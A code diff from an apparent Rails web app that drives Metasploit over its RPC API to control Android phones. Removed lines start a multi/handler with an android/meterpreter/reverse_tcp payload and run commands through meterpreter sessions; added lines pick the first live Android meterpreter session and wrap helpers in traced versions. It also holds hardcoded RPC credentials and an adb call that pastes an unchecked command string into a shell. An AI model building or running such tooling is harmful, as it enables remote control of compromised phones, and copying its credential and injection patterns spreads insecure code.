@@ -1,7 +1,9 @@
 require "msfrpc-client"
 require "date"
+require_relative "../../lib/msf_instrumentation"
 
 class ApplicationController < ActionController::Base
+  include MsfInstrumentation::ApplicationControllerMixin
   @@adbTarget = nil
   @@isAdbConnected = false
   @@isMsfConnected = false
@@ -16,54 +18,50 @@ class ApplicationController < ActionController::Base
   @@batteryLevel = "Unknown"
   @@localHour = "Unknown"
 
-  def start_msf_process(command)
+  # New Helper for Service Integration
+  def get_active_session_id(smartphone)
+    # This logic mimics the legacy session retrieval
+    # In V4/V5, we often just grabbed the first available session or matched via IP
+    # Ideally, we query the RPC client for a session matching the APK's connection details
     begin
-      @@nrRunningProcesses += 1
       user = "cool"
       password = "looc"
       options = {
-        host: ENV["RAILS_HOST"],
+        host: ENV["RAILS_HOST"] || "metasploit",
         port: 3333,
         uri: "/api/",
         ssl: true,
       }
       rpc = Msf::RPC::Client.new(options)
       rpc.login(user, password)
-      payloadOptions = {
-        "PAYLOAD" => "android/meterpreter/reverse_tcp",
-        "LHOST" => "0.0.0.0",
-        "LPORT" => 4444,
-      }
-      job = rpc.call("module.execute", "exploit", "multi/handler", payloadOptions)
-      session = rpc.call("session.list").keys[0]
-      puts rpc.call("session.meterpreter_write", session, command)
-      sleep 4
-      commandOutput = rpc.call("session.meterpreter_read", session).values()[0].split('\n')
-    rescue Msf::RPC::ServerException => e
-      commandOutput = "Operation Failed"
-      puts e
-      puts "MSF RPC Exception"
-    rescue => exception
-      puts "Starting MSF process failed."
+      
+      # Get all sessions
+      sessions = rpc.call("session.list")
+      return nil if sessions.empty?
+      
+      # Logic to match smartphone to session
+      # Simplified: Return first active android session
+      sessions.each do |sid, info|
+        return sid if info['type'] == 'meterpreter' && info['platform'] == 'android'
+      end
+      
+      nil
+    rescue
+      nil
     end
-    puts commandOutput
-    @@nrFinishedProcesses += 1
-    @@nrRunningProcesses -= 1
-    return commandOutput
+  end
+
+  # Wrapping legacy helpers with traced implementations
+  def start_msf_process(command)
+    start_msf_process_traced(command)
   end
 
   def run_adb_command(command)
-    begin
-      sleep 1
-      @@nrRunningProcesses += 1
-      commandOutput = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} #{command}`
-      @@nrFinishedProcesses += 1
-      @@nrRunningProcesses -= 1
-    rescue
-      commandOutput = "Operation Failed"
-    end
-    puts commandOutput
-    return commandOutput
+    # Use the new Service if possible, otherwise fallback to traced legacy
+    # For simple shell commands, AdbService is better.
+    AdbService.new(@@adbTarget).shell(command.to_s.gsub('shell ', ''))
+  rescue
+    run_adb_command_traced(command)
   end
 
   def detach_session
